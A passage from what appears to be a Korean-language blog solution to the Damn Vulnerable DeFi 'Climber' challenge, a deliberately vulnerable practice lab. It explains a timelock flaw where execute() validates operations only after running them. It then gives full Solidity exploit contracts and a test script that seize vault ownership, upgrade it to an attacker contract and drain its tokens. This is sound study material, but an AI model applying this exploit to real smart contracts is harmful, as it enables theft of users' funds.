\u0026lt; 256); require(targets.length == values.length); require(targets.length == dataElements.length); bytes32 id = getOperationId(targets, values, dataElements, salt); require(getOperationState(id) == OperationState.Unknown, \u0026#34;Operation already known\u0026#34;); operations[id].readyAtTimestamp = uint64(block.timestamp) + delay; operations[id].known = true; } /** Anyone can execute what has been scheduled via `schedule` */ function execute( address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt ) external payable { require(targets.length \u0026gt; 0, \u0026#34;Must provide at least one target\u0026#34;); require(targets.length == values.length); require(targets.length == dataElements.length); bytes32 id = getOperationId(targets, values, dataElements, salt); // Vulnerable! Execute -\u0026gt; Validation Check  // (1) Execute operation  for (uint8 i = 0; i \u0026lt; targets.length; i++) { targets[i].functionCallWithValue(dataElements[i], values[i]); // attacker -\u0026gt; updateDelay, grantRole, transferOwnership, *schedule*  } // (2) Check that executed operation is valid  require(getOperationState(id) == OperationState.ReadyForExecution); operations[id].executed = true; } ... 취약점은 ClimberTimelock.sol의 execute()에 존재한다.\nschedule()\n PROPOSER_ROLE이 부여된 계정만이 실행 가능 targets / values / dataElements / salt 를 이용해 특정 operation을 식별할 수 있는 ID를 생성  [] 리스트 형태로 일련의 작업들을 묶어서 실행 가능   실행할 operation ID의 readyAtTimestamp = 현재 timestamp(schedule에 추가된 시간) + 1 hour(delay)로 설정  execute()\n PROPOSER_ROLE 권한을 가진 계정이 schedule()을 통해 추가한 operation을 ID를 기반으로 누구나 실행 가능한 것이 목적(..이지만 취약한 코드에 의해 누구나 operation 등록 및 실행이 가능) operation을 실행한 이후에, 해당 operation에 대한 ID 계산 및 scehdule 등록/적절 여부 판단 공격자가 다음과 같은 operation 목록을 생성 및 실행하여, Logic 컨트랙트인 ClimberVault의 ownership 획득 가능  (1) ClimberTimelock::updateDelay(0)  공격자가 실행한 operation이 require(getOperationState(id) == OperationState.ReadyForExecution);를 우회할 수 있도록 하기위해 실행   (2) AccessControl::grantRole(PROPOSER_ROLE, attacker_contract)  공격자가 생성한 컨트랙트에 PROPOSER_ROLE을 부여함으로써, ClimberTimelock::schedule()을 실행할 수 있는 권한 확보 공격자가 생성한 컨트랙트는 ClimberVault Logic 컨트랙트를 제어할 수 있는 권한 확보(PROPOSER_ROLE은 ADMIN_ROLE도 부여받음)   (3) OwnableUpgradeable::transferOwnership(attacker_eoa)  UUPS 패턴으로 배포된 ClimberVault Logic 컨트랙트의 ownership을 공격자에게 이전 -\u0026gt; 공격자는 Logic 컨트랙트 업그레이드가 가능하도록 하는 권한 확보   (4) ClimberTimelock::schedule()  operation의 마지막에 schedule()을 호출함으로써, schedule에 operation 추가 및 require(getOperationState(id) == OperationState.ReadyForExecution); 우회      Exploit attacker-contracts/ClimberExploit.sol\n ClimberTimelock의 취약점을 이용하여 ClimberVault의 ownership 이전  // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; //import \u0026#34;@openzeppelin/contracts/access/AccessControl.sol\u0026#34;;  interface IClimberTimelock { function schedule(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external; function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external; } contract ClimberExploit { address public attackerEOA; address public timelockAddr; address public vaultAddr; address[] public targets; uint256[] public values; bytes[] public dataElements; bytes32 public constant PROPOSER_ROLE = keccak256(\u0026#34;PROPOSER_ROLE\u0026#34;); constructor (address _attackerEOA, address _timelockAddr, address _vaultAddr) { attackerEOA = _attackerEOA; timelockAddr = _timelockAddr; vaultAddr = _vaultAddr; } function exploit() external { // updateDelay set to 0  targets.push(timelockAddr); values.push(0); dataElements.push(abi.encodeWithSignature(\u0026#34;updateDelay(uint64)\u0026#34;, uint64(0))); // Granting the PROPOSER role to this attacker contract(ClimberExploit.sol)  // AccessControl.sol  targets.push(timelockAddr); values.push(0); dataElements.push(abi.encodeWithSignature(\u0026#34;grantRole(bytes32,address)\u0026#34;, PROPOSER_ROLE, address(this))); // Transfer ownership of Logic Contract(ClimberVault) to attacker EOA  // OwnableUpgradeable.sol  targets.push(vaultAddr); values.push(0); dataElements.push(abi.encodeWithSignature(\u0026#34;transferOwnership(address)\u0026#34;, attackerEOA)); // to bypass schedule check  targets.push(address(this)); values.push(0); dataElements.push(abi.encodeWithSignature(\u0026#34;triggerSchedule()\u0026#34;)); // execute()  IClimberTimelock(timelockAddr).execute(targets, values, dataElements, keccak256(\u0026#34;salt\u0026#34;)); } function triggerSchedule() external { // triggering VaultTimelock::schedule()  IClimberTimelock(timelockAddr).schedule(targets, values, dataElements, keccak256(\u0026#34;salt\u0026#34;)); } } attacker-contracts/ClimberAttackerLogic.sol\n UUPS 패턴으로 배포되어있는 ClimberVault를 아래 공격자의 Logic 컨트랙트로 업그레이드  // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \u0026#34;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\u0026#34;; import \u0026#34;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\u0026#34;; import \u0026#34;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\u0026#34;; import \u0026#34;@openzeppelin/contracts/token/ERC20/IERC20.sol\u0026#34;; /** * @title ClimberVault * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner. * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz) */ contract ClimberAttackerLogic is Initializable, OwnableUpgradeable, UUPSUpgradeable { uint256 public constant WITHDRAWAL_LIMIT = 1 ether; uint256 public constant WAITING_PERIOD = 15 days; uint256 private _lastWithdrawalTimestamp; address private _sweeper; modifier onlySweeper() { require(msg.sender == _sweeper, \u0026#34;Caller must be sweeper\u0026#34;); _; } /// @custom:oz-upgrades-unsafe-allow constructor  constructor() initializer {} function initialize() initializer external { // Initialize inheritance chain  __Ownable_init(); __UUPSUpgradeable_init(); // Deploy timelock and transfer ownership to it  //transferOwnership(address(new ClimberTimelock(admin, proposer)));  //_setSweeper(sweeper);  _setLastWithdrawal(block.timestamp); _lastWithdrawalTimestamp = block.timestamp; } ... // Allows trusted sweeper account to retrieve any tokens  function sweepFunds(address tokenAddress) external { IERC20 token = IERC20(tokenAddress); require(token.transfer(msg.sender, token.balanceOf(address(this))), \u0026#34;Transfer failed\u0026#34;); } ... // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade  function _authorizeUpgrade(address newImplementation) internal onlyOwner override {} } climber.challenge.js\n// Change CimberVault\u0026#39;s owner to attacker using vulnerability let exploitContract = await (await ethers.getContractFactory(\u0026#39;ClimberExploit\u0026#39;, attacker)).deploy(attacker.address, this.timelock.address, this.vault.address); await exploitContract.connect(attacker).exploit(); // Upgrade to attacker\u0026#39;s Contract this.climberAttackerLogic = await ethers.getContractFactory(\u0026#39;ClimberAttackerLogic\u0026#39;, attacker); let attacker_vault = await upgrades.upgradeProxy(this.vault.address, this.climberAttackerLogic); // drained all tokens from vault await attacker_vault.connect(attacker).sweepFunds(this.token.address); ","permalink":"https://inhack.github.io/kr/posts/solution-damn-vulnerable-defi/","summary":"\u003chr\u003e\n\u003cp\u003e\u003ca href=\"https://www.damnvulnerabledefi.xyz/\"\u003e\u003cstrong\u003e\u003cem\u003e\u0026lsquo;Damn Vulnerable DeFi\u0026rsquo;\u003c/em\u003e\u003c/strong\u003e\u003c/a\u003e is an offensive security playground for decentralized finances.\u003c/p\u003e\n\u003cp\u003eThis article offers a brief summary and exploit code of each challenge.\u003c/p\u003e\n\u003cp\u003eFor detailed source code and contents, please check \u003ca href=\"https://github.com/inhack/damn-vernerable-defi-solutions\"\u003emy github repository\u003c/a\u003e.\u003c/p\u003e","title":"[Solution] Damn Vulnerable DeFi"}]